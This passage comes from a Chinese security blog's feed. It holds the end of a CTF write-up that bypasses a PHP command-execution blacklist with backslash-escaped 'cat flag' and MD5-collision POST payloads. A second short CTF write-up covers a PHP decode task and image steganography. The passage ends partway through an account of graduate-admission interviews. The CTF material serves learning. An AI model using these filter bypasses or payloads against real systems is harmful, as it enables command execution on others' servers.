class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">hex</span> = binascii.b2a_hex(filename)  <span class="comment">#b2a是返回二进制数据的16进制表示</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>)</span><br><span class="line">base1 = base64.b64encode(<span class="built_in">hex</span>)</span><br><span class="line">base2 = base64.b64encode(base1)</span><br><span class="line"><span class="built_in">print</span>(base2.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入index.php后可以得到index.php文件名的加密后的名字，放到img里面查看源代码为base64加密的，把base64解密后即可得到index.php的源代码</p><p>index.php源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &quot;success&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>对源码进行审计，重点在命令执行部分。</p><p>命令执行有很多过滤，这里过滤不完全（正则表达式有待学习），可用ca\t%20fl\ag绕过。</p><p>在命令执行前需要满足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>这里可以考虑fastcoll构造两个hash值相同的二进制文件。</p><p>我这里构造好了，具体的使用方法可以百度fastcoll。</p><p>使用该软件构造好后，使用如下php脚本可以获得urlencode后的md5值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function  readmyfile($path)&#123;</span><br><span class="line">    $fh &#x3D; fopen($path, &quot;rb&quot;);</span><br><span class="line">    $data &#x3D; fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;二进制hash &#39;. md5( (readmyfile(&quot;1.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo  &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;1.txt&quot;));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &#39;URLENCODE hash &#39;.md5(urlencode (readmyfile(&quot;1.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &#39;二进制hash &#39;.md5( (readmyfile(&quot;2.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo  &#39;URLENCODE &#39;.  urlencode(readmyfile(&quot;2.txt&quot;));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;2.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br></pre></td></tr></table></figure><p>下面将这两个MD5值分别给POST的a和b赋值，同时URL的?cmd=ca\t%20fl\ag</p><p>这里我踩了个坑，一开始是GET方式提交请求，然后手动改方法为POST，一直不能成功，后来发现可能是某些请求头的问题，我这里用hackbar发送POST请求，请求体随便写，在BP里面抓包，将请求体的内容改成a和b的值，在此之后即可愉快地命令执行。</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>请求包:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ca\t%20/fl\ag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1029</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC</span><br></pre></td></tr></table></figure><p>响应包如下图：</p><img src="http://cdn.polowong.top/static/images/axbweb1.jpg"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好久没刷web了，太菜了，这道题一开始没思路，看着师傅们的wp复现出来的，踩坑踩了大概一个小时。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;致谢&quot;&gt;&lt;a href=&quot;#致谢&quot; class=&quot;headerlink&quot; title=&quot;致谢&quot;&gt;&lt;/a&gt;致谢&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/Cl0ud/p/12585242.html&quot;&gt;https://www.cn</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>山东省网络技术大赛-网络安全赛道初赛第二场wp</title>
    <link href="https://polosec.github.io/2020/10/19/%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%88%9D%E8%B5%9B%E7%AC%AC%E4%BA%8C%E5%9C%BAwp/"/>
    <id>https://polosec.github.io/2020/10/19/%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%88%9D%E8%B5%9B%E7%AC%AC%E4%BA%8C%E5%9C%BAwp/</id>
    <published>2020-10-19T04:10:22.000Z</published>
    <updated>2020-10-19T04:10:38.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>组委会太逆天了，pwn环境挂了，群里没人理的</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>进入首页有个提示，查看源码后psw.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    highlight_file( <span class="keyword">__FILE__</span> );</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$string</span>,<span class="variable">$option</span>=<span class="string">&#x27;encode&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$option</span>==<span class="string">&#x27;encode&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$lenght</span>=strlen(<span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$lenght</span>;<span class="variable">$x</span>++) &#123; </span><br><span class="line"></span><br><span class="line">            @<span class="variable">$tmp</span>=substr(<span class="variable">$string</span>,<span class="variable">$x</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ord</span>=ord(<span class="variable">$tmp</span>)+<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">            @<span class="variable">$result</span>=<span class="variable">$result</span>.chr(<span class="variable">$ord</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$option</span>==<span class="string">&#x27;decode&#x27;</span>)&#123;</span><br><span class="line">       </span><br><span class="line">      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    encode(<span class="string">&#x27;_Y^kdg_k&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把这段代码放到本地用phpstudy跑起来，最后调用时decode换成encode，跑出来个密码，为ichunqiu，输入到首页即可获得flag</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><p>一张图片，直接stegsolve</p><img src="http://cdn.polowong.top/static/images/pgy.png"><p>往右点，有一张二维码</p><img src="http://cdn.polowong.top/static/images/sdcsmisc.jpg">扫下来base32解密即可得到flag。]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;组委会太逆天了，pwn环境挂了，群里没人理的&lt;/p&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>网络安全专业-夏令营/预推免面经</title>
    <link href="https://polosec.github.io/2020/10/12/%E9%9D%A2%E7%BB%8F/"/>
    <id>https://polosec.github.io/2020/10/12/%E9%9D%A2%E7%BB%8F/</id>
    <published>2020-10-11T16:34:55.000Z</published>
    <updated>2021-01-26T10:02:17.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>现在是2020年10月12日下午18点19分，我于今天上午收到了来自电子科技大学的录取通知，确定后，意味着保研之旅正式结束。</p><img src="http://cdn.polowong.top/static/images/uestc.jpg"><p>在这长达一年的准备时间里，感谢父母、家人、学校、学院对我的支持，感谢保研前辈对我的指点，感谢朋友们为我提供信息，加油鼓劲。</p><h1 id="夏令营和预推免情况"><a href="#夏令营和预推免情况" class="headerlink" title="夏令营和预推免情况"></a>夏令营和预推免情况</h1><p>夏令营申请学校：30+所985，211学校，只有山大、中海洋、中央财经、国防科大电子对抗学院通过了初审。</p><p>夏令营通过学校：中海洋专硕、国防科大电子对抗学院 网络安全 学硕，其中拒绝了中央财经的面试。</p><p>预推免申请学校：山大、天大、电子科大、西北工业大学、哈工大、复旦、西电等。</p><p>预推免通过学校：山大网安学硕、天大网安学硕、电子科大网安学硕（其中拒绝了西北工大、西电面试）</p><p>最终去向：电子科技大学-计算机学院-网络空间安全-学硕 ，张小松教授团队 ，研究方向：云计算与IOT安全。</p><h1 id="个人情况介绍"><a href="#个人情况介绍" class="headerlink" title="个人情况介绍"></a>个人情况介绍</h1><h2 id="背景简述"><a href="#背景简述" class="headerlink" title="背景简述"></a>背景简述</h2><p>GPA:4.1/5.0（专业1/49）;  CET-4:540;  CET-6:548;</p><p>一篇国家级普刊，美赛一等奖，蓝桥杯省二，两次校一等奖学金、山东省政府奖学金、数次CTF竞赛经历。</p><p>一段专业短期实习经历，两个小项目。（全部专业高度相关）</p><h2 id="详细介绍"><a href="#详细介绍" class="headerlink" title="详细介绍"></a>详细介绍</h2><p>我来自山东省一所一本学校——曲阜师范大学，本科背景通俗地讲叫做“双非”。</p><p>我自初中起对网络安全技术感兴趣，一直在断断续续地摸索，大学选择了软件工程专业，算是正式进入计算机行业科班。</p><p>大一没有特别认真学习，GPA为3.8/5，暑假有一段香港访学经历，无校级以上奖项。</p><p>大一从香港回来后，励志去港校，经咨询后GPA对我来说至少要4以上，于是大二开始每天认真学习专业知识，泡自习室。大二通过了四六级考试，四级540，六级第一次501。拿到了蓝桥杯编程山东省二等奖（水），随师哥去外省参加了两次CTF线下赛（划水），没什么成绩。大二最终GPA为4.01，大二学年GPA为4.32，全年级最高。</p><p>大三在师哥的建议下决定尝试保研，于是开始从公众号了解相关政策信息，一开始也是懵懂无知的状态，知道了需要准备简历、项目、竞赛、论文、四六级。</p><h1 id="保研准备"><a href="#保研准备" class="headerlink" title="保研准备"></a>保研准备</h1><p>大三上学期通过了六级考试，在严格的模拟训练下拿到了548分，还算满意。由于疫情原因在家耽误了一段时间，过年那段时间主要在家学保研课，了解如何写个人简历、自我介绍、自我陈述、学校申请等相关流程。</p><p>2020年2月份与两位数学的队友一起参加了美国大学生数学建模竞赛，我基本负责除了写论文和建模外的其他内容。（我是辅助），最终拿了国际一等奖的成绩，这与我两位队友的努力是分不开的，致谢。</p><p>2020年2月份大致准备好了简历、自我介绍（中英文，长短各一份，共四份）、个人陈述、推荐信、证书证件扫描等文书工作。简历的完善工作一直到最后一次面试前，约四五十次大大小小的修改吧。</p><p>2020年三月份成功投稿了我在一月份开始写的一篇期刊，投稿至国家级普刊，期间学习了很多知识。</p><p>2020年三月开始正式打CTF、学习CTF知识，写博客。</p><p>2020年4月完成了基于flask框架的图书管理系统（一个很小的项目，总共就四五百行代码）四月份开始了解专业前景，向各位前辈以及知乎、交流群里打听专业强校、强老师。</p><p>2020年5月完成了基于Nmap和Masscan扫描器的Web扫描器，并改进了CTF-wscan扫描器（主要是优化了多线程与重复扫描问题，当然目前还存在一些bug）。五月份开始联系导师，其中有一位南方学校的老师为我提供了一次宝贵的实习机会。在此向魏老师致谢。</p><p>2020年6月在老师的推荐下赴广州进行实习，职位是渗透测试工程师。两个月的实习期间主要是学会了一些思路与工具，收获了一些好友与人脉。期间也在不断地投递简历与联系老师。六月底通过了中海洋、山大的初审。</p><p>2020年7月拿到了中海洋优营，国防科大电子对抗学院录取范围第二名，参加电子科技大学导师团队面试并通过，与此同时继续实习。</p><p>2020年8月通过了深信服北京安全研发中心实习生两轮技术面，因学校时间冲突原因放弃hr面。</p><p>2020年9月通过北京hw蓝队面试，薪资是最低的1.3k一天包吃住（彩笔）、通过了天大复试，拿到了学硕offer</p><p>2020年10月通过电子科大、山大复试，拿到本校推免资格，拿到学硕offer并上岸。</p><h1 id="劝告"><a href="#劝告" class="headerlink" title="劝告"></a>劝告</h1><p><strong>保研是一场信息战，但要学会如何获取有用、有价值的信息，学会交朋友，有时候外校朋友的信息能决定你的命运</strong></p><p><strong>联系老师很重要，你会发现我所有入营且拿到offer的学校都提前联系了老师。</strong></p><h1 id="夏令营面经"><a href="#夏令营面经" class="headerlink" title="夏令营面经"></a>夏令营面经</h1><p>由于夏令营都在卷，入营非常少，山大是报名的全入营了，没有参考价值。</p><p>下面按照时间顺序来说</p><h2 id="中国海洋大学-信息学院"><a href="#中国海洋大学-信息学院" class="headerlink" title="中国海洋大学 信息学院"></a>中国海洋大学 信息学院</h2><p>中海洋第一个面试，我提前联系了老师，老师人很好，在信息学院做安全算是比较好的老师了，邮件联系后，正好老师负责夏令营审批，给了我入营资格。今年中海洋计算机夏令营初审报了四百多，可想而知。</p><p>在入营后有一个热身活动，选定一个方向以及问题，对这个问题展开研究并写论文和ppt录屏五分钟内汇报。我选的是系统安全的问题，meltdown，防御方法有KASLR等。</p><p>面试前一晚有个机试，据说机试不算成绩里面，但是面试官会有机试的成绩。大概题目都是些比较简单的格式输入输出，算平均分之类的，最后一个是类似矩阵转置输出。。没写上来草。</p><p>面试大概是上来先抽题 我抽到了简述计算机网络OSI七层模型，然后就是老师提问，问我极限编程的概念。。。不会；问我MIPS了解多少。。。不会；问我ACID ，说了AID忘了C的含义是啥了。。。尴尬；最后等了一周给了专硕。</p><h2 id="山东大学-网络空间安全学院"><a href="#山东大学-网络空间安全学院" class="headerlink" title="山东大学 网络空间安全学院"></a>山东大学 网络空间安全学院</h2><p>SDU网安是我比较想去的一个学校，有想跟的老师，可惜那位老师不要我，当然，还有一位想跟的老师，那位老师人很好，我也提前和他联系了。</p><p>夏令营山大网安面试120个人收17个优营，包括6个左右的本校..</p><p>面试当天问我对密码学有多少了解，我说了解过对称、非对称加密，在蚁剑加密流量分析中用过。然后问我了解过哪些系统安全方面的漏洞，我说meltdown，我说本科主要是做web方向，老师说希望我以后多了解系统安全的知识。（其他细节记不太清了 夏令营印象不是太深刻）</p><p>最后优营当然没我啥事</p><h2 id="国防科技大学-电子对抗学院"><a href="#国防科技大学-电子对抗学院" class="headerlink" title="国防科技大学 电子对抗学院"></a>国防科技大学 电子对抗学院</h2><p>NUDT电抗我先联系了一位教授，如沐春风的感觉，给人一种和蔼可亲的感觉，在和地方生学长交流的时候得知该老师水平很高，要求严格，不缺学生，我也很荣幸他能相中我。</p><p>在面试的时候设备问题，一直吱吱啦啦对面听不清，进行英文自我介绍的时候被迫叫停。后面简单问了问项目、实习和美赛经历，重点问了美赛里面我承担的工作，并问了主要是谁翻译的。</p><p>最后考核结果夏令营录取名额网安为10个，我排第二，免预推免复试。</p><h2 id="中央财经大学-信息学院"><a href="#中央财经大学-信息学院" class="headerlink" title="中央财经大学 信息学院"></a>中央财经大学 信息学院</h2><p>没去面试</p><h2 id="西北工业大学-网络空间安全学院"><a href="#西北工业大学-网络空间安全学院" class="headerlink" title="西北工业大学 网络空间安全学院"></a>西北工业大学 网络空间安全学院</h2><p>没去面试</p><h1 id="预推免面经"><a href="#预推免面经" class="headerlink" title="预推免面经"></a>预推免面经</h1><p>预推免的bar明显低了不少。</p><h2 id="电子科技大学-导师面试"><a href="#电子科技大学-导师面试" class="headerlink" title="电子科技大学 导师面试"></a>电子科技大学 导师面试</h2><p>电子科技大学在七月下旬提前联系导师，参加了导师团队面试。一共大概三四位老师，首先用中文简单地介绍了自己，问我的项目写了多少行代码，是不是自己写的，问我的扫描器能否在扫描速度很快的情况下扫描完所有目标URL，问ZOOMEYE\FOFA\SHODAN等空间测绘引擎的区别是什么（主要看着简历问），问了问我美赛的获奖比例以及负责的工作。最后问了我校是否985211，数小时后被通知通过团队面试，经过学院面试后可直接报老师。</p><h2 id="天津大学-智能与计算学部"><a href="#天津大学-智能与计算学部" class="headerlink" title="天津大学 智能与计算学部"></a>天津大学 智能与计算学部</h2><p>天大我先联系了一位老师，这位老师的研究方向和我非常符合，老师也很明确地想要我，但是夏令营卡985211，所以我没进去，等预推免才进去的。</p><p>面试首先是一分钟的英文自我介绍，介绍过后讲一下自己准备的PPT（可以中文再介绍一下）然后讲一个你认为最重要的项目（我当时听错了，我以为是不限科研经历，只限一个项目，所以我一共讲了三个，面试老师有些不太高兴），最后问了问我的论文是怎么写的，创新点在哪里。结束面试</p><p>最后给了网安学硕，非常非常感谢许老师。</p><h2 id="山东大学-网络空间安全学院-1"><a href="#山东大学-网络空间安全学院-1" class="headerlink" title="山东大学 网络空间安全学院"></a>山东大学 网络空间安全学院</h2><p>和老师联系过后我觉得去山大专硕还是比较有希望的，于是报了山大的预推免，比较晚，面试在8号。</p><p>面试首先是一轮拷问，还是问我美赛负责的工作、问我本科做什么方向，说我本科打web，研究生方向不太一样。然后有个老师用英文让我描述一下我的数据可视化项目，还有一位老师问了KASLR的作用以及原理。。原理没说上来，还是这位老师，问了我的论文创新点在哪里，有没有自己的新东西….一针见血。。果然不一般。</p><p>最后想着能有专硕就行了，结果老师帮我递补了学硕，感谢sdu，感谢郭老师。</p><h2 id="电子科技大学-计算机科学与工程学院"><a href="#电子科技大学-计算机科学与工程学院" class="headerlink" title="电子科技大学 计算机科学与工程学院"></a>电子科技大学 计算机科学与工程学院</h2><p>UESTC是我最后一战，非常紧张。</p><p>面试首先是三分钟的PPT自我介绍，介绍了学术背景、科研经历、项目经历。</p><p>然后是抽题 ，抽到的题是描述算法，如何找出两个stirng的公共字符。</p><p>接下来是英文问题，describe a project 和 why choose our 